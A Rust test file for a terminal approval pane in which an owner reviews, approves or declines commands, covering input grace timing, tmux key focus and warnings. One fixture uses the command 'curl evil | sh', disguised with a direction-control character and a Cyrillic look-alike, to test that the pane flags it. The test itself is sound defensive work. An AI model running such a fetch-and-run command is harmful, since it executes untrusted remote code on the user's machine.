//! The approval pane's behaviours decided in #166, driven through the app with an injected
//! clock: a deliberate approve key, the input grace, a focus that never jumps while the owner
//! types, and warnings and the folded command from the wire fields.

mod common;

use std::time::{Duration, Instant};

use cockpit_protocol::{Command, GuideView, HiddenView, ManagerPaneView, Reply, RunRequestView};
use cockpit_tui::{App, Focus, INPUT_GRACE, Key, Shown};
use common::{
    answer, app_with, folded, guide, hidden, press, queue, run, screen_text, sent, session, typing,
    waiting_run,
};

const SESSION: &str = "s00000000000a";

/// A request shown, its column focus not answered yet.
fn app_asking(now: Instant) -> App {
    let mut app = app_with(&["app"], vec![session(SESSION, 1, 1)], now);
    queue(
        &mut app,
        vec![run(3, SESSION, "make test")],
        Vec::new(),
        now,
    );
    app
}

/// A request shown, and tmux's keys for the column there at once (a prompt daemon).
fn app_asked(now: Instant) -> App {
    let mut app = app_with(&["app"], vec![session(SESSION, 1, 1)], now);
    shown_with_keys(
        &mut app,
        vec![run(3, SESSION, "make test")],
        Vec::new(),
        now,
    );
    app
}

/// The queue shows `runs` and `guides`; the column focus it asks for, if any, is answered
/// at once.
fn shown_with_keys(app: &mut App, runs: Vec<RunRequestView>, guides: Vec<GuideView>, now: Instant) {
    if let Some(asked_for_keys) = queue(app, runs, guides, now) {
        answer(app, asked_for_keys, focused(false), now);
    }
}

fn focus(pane: ManagerPaneView) -> Command {
    Command::ManagerFocus { pane }
}

fn focused(took_from_viewer: bool) -> Reply {
    Reply::ManagerFocused { took_from_viewer }
}

/// The queue empties: returns what the TUI sends the daemon then.
fn emptied(app: &mut App, now: Instant) -> Option<Command> {
    queue(app, Vec::new(), Vec::new(), now)
}

fn after_grace(now: Instant) -> Instant {
    now + INPUT_GRACE + Duration::from_millis(1)
}

#[test]
fn a_request_appearing_takes_focus_and_its_keys_are_ignored_for_the_grace() {
    let now = Instant::now();
    let mut app = app_asking(now);

    let early = app.key(Key::Char('y'), now + INPUT_GRACE - Duration::from_millis(1));

    assert_eq!(app.focus(), Focus::Pane);
    assert_eq!(
        (early.used, early.send),
        (Some("approval-ignored-in-grace"), Vec::new())
    );
}

#[test]
fn a_request_appearing_asks_the_daemon_once_for_the_keys_the_viewer_may_hold() {
    let now = Instant::now();
    let mut app = app_with(&["app"], vec![session(SESSION, 1, 1)], now);

    let appeared = queue(
        &mut app,
        vec![run(3, SESSION, "make test")],
        Vec::new(),
        now,
    );
    let still_shown = queue(
        &mut app,
        vec![run(3, SESSION, "make test")],
        Vec::new(),
        after_grace(now),
    );

    assert_eq!(
        (appeared, still_shown),
        (Some(focus(ManagerPaneView::Column)), None)
    );
}

#[test]
fn a_key_ignored_in_the_grace_starts_it_again() {
    let now = Instant::now();
    let mut app = app_asked(now);
    let typed_at = now + INPUT_GRACE - Duration::from_millis(1);
    app.key(Key::Char('e'), typed_at);

    let still_typing = app.key(Key::Char('y'), after_grace(now));

    assert_eq!(
        (still_typing.used, still_typing.send),
        (Some("approval-ignored-in-grace"), Vec::new())
    );
}

#[test]
fn the_keys_arriving_from_tmux_start_the_grace_again() {
    let now = Instant::now();
    let mut app = app_asking(now);
    let focused_at = after_grace(now);
    answer(
        &mut app,
        focus(ManagerPaneView::Column),
        focused(true),
        focused_at,
    );

    let first = app.key(Key::Char('y'), after_grace(now) + Duration::from_millis(1));

    assert_eq!(
        (first.used, first.send),
        (Some("approval-ignored-in-grace"), Vec::new())
    );
}

/// The column's keys answered later than the grace (#439): the daemon was slow.
fn late(now: Instant) -> Instant {
    after_grace(now) + Duration::from_secs(1)
}

#[test]
fn while_the_column_s_keys_are_on_their_way_the_pane_says_to_read_first() {
    let now = Instant::now();
    let app = app_asking(now);

    assert!(screen_text(&app, late(now)).contains("Read it first: keys work again in a moment."));
}

#[test]
fn a_key_before_the_column_s_keys_arrive_is_ignored() {
    let now = Instant::now();
    let mut app = app_asking(now);

    let early = app.key(Key::Char('y'), late(now));

    assert_eq!(
        (early.used, early.send),
        (Some("approval-ignored-in-grace"), Vec::new())
    );
}

#[test]
fn once_late_keys_arrive_the_first_y_after_the_grace_approves() {
    let now = Instant::now();
    let mut app = app_asking(now);
    answer(
        &mut app,
        focus(ManagerPaneView::Column),
        focused(true),
        late(now),
    );

    let approved = app.key(Key::Char('y'), after_grace(late(now)));

    assert_eq!(approved.used, Some("approval-approve"));
}

#[test]
fn a_failed_column_focus_lets_the_pane_take_keys_after_a_grace() {
    let now = Instant::now();
    let mut app = app_asking(now);
    app.answer(
        &focus(ManagerPaneView::Column),
        Err("no manager".to_owned()),
        late(now),
    );

    let approved = app.key(Key::Char('y'), after_grace(late(now)));

    assert_eq!(approved.used, Some("approval-approve"));
}

#[test]
fn the_pane_reads_first_until_every_column_focus_it_asked_for_is_answered() {
    let now = Instant::now();
    let mut app = app_asking(now);
    emptied(&mut app, now);
    queue(
        &mut app,
        vec![run(4, SESSION, "make lint")],
        Vec::new(),
        now,
    );
    answer(&mut app, focus(ManagerPaneView::Column), focused(true), now);

    let early = app.key(Key::Char('y'), late(now));

    assert_eq!(early.used, Some("approval-ignored-in-grace"));
}

#[test]
fn the_last_column_focus_answer_lets_y_approve_after_its_grace() {
    let now = Instant::now();
    let mut app = app_asking(now);
    emptied(&mut app, now);
    queue(
        &mut app,
        vec![run(4, SESSION, "make lint")],
        Vec::new(),
        now,
    );
    answer(&mut app, focus(ManagerPaneView::Column), focused(true), now);
    answer(
        &mut app,
        focus(ManagerPaneView::Column),
        focused(false),
        late(now),
    );

    let approved = app.key(Key::Char('y'), after_grace(late(now)));

    assert_eq!(approved.used, Some("approval-approve"));
}

#[test]
fn y_after_the_grace_approves_the_revision_and_digest_shown() {
    let now = Instant::now();
    let mut app = app_asked(now);

    let approved = app.key(Key::Char('y'), after_grace(now));

    assert_eq!(
        approved.send,
        [Command::ApprovalApprove {
            request: 3,
            revision: 1,
            digest: "digest-3-1".to_owned(),
        }]
    );
}

#[test]
fn no_navigation_key_approves() {
    let now = Instant::now();
    let mut app = app_asked(now);

    let steps = press(
        &mut app,
        &[
            Key::Enter,
            Key::Char('j'),
            Key::Char('k'),
            Key::Up,
            Key::Down,
            Key::Left,
            Key::Right,
            Key::Char(' '),
            Key::Esc,
        ],
        after_grace(now),
    );

    assert_eq!(sent(&steps), Vec::<Command>::new());
}

#[test]
fn taking_focus_again_starts_the_grace_again() {
    let now = Instant::now();
    let mut app = app_asked(now);
    let later = after_grace(now);
    app.key(Key::Tab, later);
    app.key(Key::Tab, later);

    let early_at = later + INPUT_GRACE - Duration::from_millis(1);
    let early = app.key(Key::Char('y'), early_at);
    let approved = app.key(Key::Char('y'), after_grace(early_at));

    assert_eq!(early.used, Some("approval-ignored-in-grace"));
    assert_eq!(approved.used, Some("approval-approve"));
}

#[test]
fn an_edited_revision_starts_the_grace_again_and_the_approval_names_it() {
    let now = Instant::now();
    let mut app = app_asked(now);
    let edited_at = after_grace(now);
    let mut edited = run(3, SESSION, "make test-all");
    edited.revision = 2;
    edited.digest = "digest-3-2".to_owned();
    queue(&mut app, vec![edited], Vec::new(), edited_at);

    let early = app.key(Key::Char('y'), edited_at);
    let approved = app.key(Key::Char('y'), after_grace(edited_at));

    assert_eq!(early.used, Some("approval-ignored-in-grace"));
    assert_eq!(
        approved.send,
        [Command::ApprovalApprove {
            request: 3,
            revision: 2,
            digest: "digest-3-2".to_owned(),
        }]
    );
}

#[test]
fn while_the_owner_types_into_a_waiting_command_a_new_request_never_takes_its_place() {
    let now = Instant::now();
    let mut app = app_with(&["app"], vec![session(SESSION, 1, 1)], now);
    shown_with_keys(&mut app, vec![waiting_run(5, SESSION)], Vec::new(), now);
    let typing_at = after_grace(now);
    app.key(Key::Char('i'), typing_at);
    typing(&mut app, "yes", typing_at);

    // A request that sorts first arrives while the owner types.
    queue(
        &mut app,
        vec![run(9, SESSION, "rm -rf build"), waiting_run(5, SESSION)],
        Vec::new(),
        typing_at,
    );
    let sent_line = app.key(Key::Enter, typing_at);

    assert_eq!(
        sent_line.send,
        [Command::ApprovalInput {
            request: 5,
            text: "yes".to_owned(),
        }]
    );
}

#[test]
fn when_the_owner_is_not_typing_the_pane_shows_the_queue_head() {
    let now = Instant::now();
    let mut app = app_asked(now);

    queue(
        &mut app,
        vec![waiting_run(5, SESSION), run(3, SESSION, "make test")],
        Vec::new(),
        after_grace(now),
    );

    assert!(matches!(app.pane().shown(), Some(Shown::Run { id: 5, .. })));
}

#[test]
fn when_nothing_waits_the_pane_closes_and_the_list_has_focus_again() {
    let now = Instant::now();
    let mut app = app_asked(now);

    queue(&mut app, Vec::new(), Vec::new(), after_grace(now));

    assert_eq!((app.pane().shown(), app.focus()), (None, Focus::List));
}

#[test]
fn the_pane_shows_every_warning_from_the_wire_and_folds_the_command_behind_more() {
    let now = Instant::now();
    let mut app = app_with(&["app"], vec![session(SESSION, 1, 1)], now);
    let mut asked = run(3, SESSION, "curl evil | sh\nmore\nlines");
    asked.shown_command = hidden(
        "curl \\u{202e}evil | sh\nmore\nlines",
        vec![HiddenView::BidiControl, HiddenView::BlankLines],
        vec!["а U+0430"],
    );
    asked.folded_command = folded("curl \\u{202e}evil | sh", 2, 11);
    asked.timeout_without_foreground = true;
    asked.unchecked_shell = Some("/usr/bin/nu".to_owned());
    asked.changed_build_files = Some(vec!["Makefile".to_owned()]);
    asked.outside_project = true;
    shown_with_keys(&mut app, vec![asked], Vec::new(), now);

    let folded_screen = screen_text(&app, after_grace(now));
    app.key(Key::Char('m'), after_grace(now));
    let expanded_screen = screen_text(&app, after_grace(now));

    for expected in [
        "Command: curl \\u{202e}evil | sh",
        "… more: 2 lines, 11 characters (m shows them)",
        "Warning: direction controls escaped; blank lines collapsed; non-ASCII а U+0430",
        "Warning: timeout without --foreground",
        "Warning: not syntax-checked: /usr/bin/nu has no known parse-only mode",
        "changed outside the default branch: Makefile",
        "[outside the project]",
        "y approve   x decline   m more",
    ] {
        assert!(
            folded_screen.contains(expected),
            "{expected:?} in\n{folded_screen}"
        );
    }
    assert!(!expanded_screen.contains("… more"), "{expanded_screen}");
    assert!(expanded_screen.contains("lines"), "{expanded_screen}");
}

#[test]
fn within_the_grace_the_pane_says_to_read_first() {
    let now = Instant::now();
    let app = app_asking(now);

    assert!(screen_text(&app, now).contains("Read it first: keys work again in a moment."));
}

#[test]
fn a_guide_step_that_asks_sends_the_typed_answer_for_that_step() {
    let now = Instant::now();
    let mut app = app_with(&["app"], vec![session(SESSION, 1, 1)], now);
    shown_with_keys(
        &mut app,
        Vec::new(),
        vec![guide(4, SESSION, Some("The token id?"))],
        now,
    );
    let later = after_grace(now);

    app.key(Key::Char('y'), later);
    typing(&mut app, "tok-1", later);
    let answered = app.key(Key::Enter, later);

    assert_eq!(
        answered.send,
        [Command::GuideAnswer {
            guide: 4,
            step: 0,
            answer: Some("tok-1".to_owned()),
        }]
    );
}

#[test]
fn x_declines_a_run_and_closes_a_guide() {
    let now = Instant::now();
    let mut declining = app_asked(now);
    let mut closing = app_with(&["app"], vec![session(SESSION, 1, 1)], now);
    shown_with_keys(&mut closing, Vec::new(), vec![guide(4, SESSION, None)], now);

    let declined = declining.key(Key::Char('x'), after_grace(now));
    let closed = closing.key(Key::Char('x'), after_grace(now));

    assert_eq!(
        (declined.send, closed.send),
        (
            vec![Command::ApprovalDecline { request: 3 }],
            vec![Command::GuideClose { guide: 4 }]
        )
    );
}

#[test]
fn a_refused_approval_shows_the_daemons_reason_on_the_status_line() {
    let now = Instant::now();
    let mut app = app_asked(now);
    let approve = app.key(Key::Char('y'), after_grace(now)).send.remove(0);

    app.answer(
        &approve,
        Err("refused: too fast: read it again, then approve".to_owned()),
        after_grace(now),
    );

    assert!(
        screen_text(&app, after_grace(now))
            .contains("approval-approve: refused: too fast: read it again, then approve")
    );
}

#[test]
fn while_the_owner_types_question_marks_and_capital_l_are_text_not_help_or_log() {
    let now = Instant::now();
    let mut app = app_with(&["app"], vec![session(SESSION, 1, 1)], now);
    shown_with_keys(
        &mut app,
        Vec::new(),
        vec![guide(4, SESSION, Some("The login?"))],
        now,
    );
    let later = after_grace(now);

    app.key(Key::Char('y'), later);
    typing(&mut app, "Login?", later);
    let answered = app.key(Key::Enter, later);

    assert_eq!(app.overlay(), None);
    assert_eq!(
        answered.send,
        [Command::GuideAnswer {
            guide: 4,
            step: 0,
            answer: Some("Login?".to_owned()),
        }]
    );
}

#[test]
fn the_keys_taken_from_the_viewer_go_back_to_it_once_the_queue_empties() {
    let now = Instant::now();
    let mut app = app_asking(now);
    answer(&mut app, focus(ManagerPaneView::Column), focused(true), now);

    let sent_on_empty = emptied(&mut app, after_grace(now));

    assert_eq!(sent_on_empty, Some(focus(ManagerPaneView::Viewer)));
}

#[test]
fn the_keys_the_list_already_had_stay_there_once_the_queue_empties() {
    let now = Instant::now();
    let mut app = app_asking(now);
    answer(
        &mut app,
        focus(ManagerPaneView::Column),
        focused(false),
        now,
    );

    let sent_on_empty = emptied(&mut app, after_grace(now));

    assert_eq!(sent_on_empty, None);
}

#[test]
fn the_keys_go_back_to_the_viewer_once_only() {
    let now = Instant::now();
    let mut app = app_asking(now);
    answer(&mut app, focus(ManagerPaneView::Column), focused(true), now);
    emptied(&mut app, after_grace(now));

    let sent_again = emptied(&mut app, after_grace(now));

    assert_eq!(sent_again, None);
}

#[test]
fn keys_tmux_moves_after_the_queue_emptied_go_back_to_the_viewer_at_once() {
    let now = Instant::now();
    let mut app = app_asking(now);
    let sent_on_empty = emptied(&mut app, now);

    let sent_on_reply = answer(&mut app, focus(ManagerPaneView::Column), focused(true), now);

    assert_eq!(
        (sent_on_empty, sent_on_reply),
        (None, Some(focus(ManagerPaneView::Viewer)))
    );
}

#[test]
fn a_second_request_s_focus_does_not_forget_the_viewer_had_the_keys() {
    let now = Instant::now();
    let mut app = app_asking(now);
    answer(&mut app, focus(ManagerPaneView::Column), focused(true), now);
    answer(
        &mut app,
        focus(ManagerPaneView::Column),
        focused(false),
        now,
    );

    let sent_on_empty = emptied(&mut app, after_grace(now));

    assert_eq!(sent_on_empty, Some(focus(ManagerPaneView::Viewer)));
}

#[test]
fn a_failed_focus_leaves_the_keys_where_they_are_once_the_queue_empties() {
    let now = Instant::now();
    let mut app = app_asking(now);
    app.answer(
        &focus(ManagerPaneView::Column),
        Err("no manager".to_owned()),
        now,
    );

    let sent_on_empty = emptied(&mut app, after_grace(now));

    assert_eq!(sent_on_empty, None);
}

#[test]
fn keys_the_owner_uses_in_the_list_stay_there_once_the_queue_empties() {
    let now = Instant::now();
    let mut app = app_asking(now);
    answer(&mut app, focus(ManagerPaneView::Column), focused(true), now);
    app.key(Key::Tab, after_grace(now));

    let sent_on_empty = emptied(&mut app, after_grace(now));

    assert_eq!(sent_on_empty, None);
}

#[test]
fn keys_the_owner_reads_the_help_with_stay_once_the_queue_empties() {
    let now = Instant::now();
    let mut app = app_asking(now);
    answer(&mut app, focus(ManagerPaneView::Column), focused(true), now);
    app.key(Key::Char('?'), after_grace(now));

    let sent_on_empty = emptied(&mut app, after_grace(now));

    assert_eq!(sent_on_empty, None);
}

#[test]
fn keys_arriving_after_the_queue_emptied_stay_while_the_form_is_open() {
    let now = Instant::now();
    let mut app = app_asking(now);
    emptied(&mut app, now);
    app.key(Key::Char('N'), now);

    let sent_on_reply = answer(&mut app, focus(ManagerPaneView::Column), focused(true), now);

    assert_eq!(sent_on_reply, None);
}

#[test]
fn keys_arriving_after_the_queue_emptied_stay_while_the_workflow_view_is_open() {
    let now = Instant::now();
    let mut app = app_asking(now);
    emptied(&mut app, now);
    app.key(Key::Char('F'), now);

    let sent_on_reply = answer(&mut app, focus(ManagerPaneView::Column), focused(true), now);

    assert_eq!(sent_on_reply, None);
}
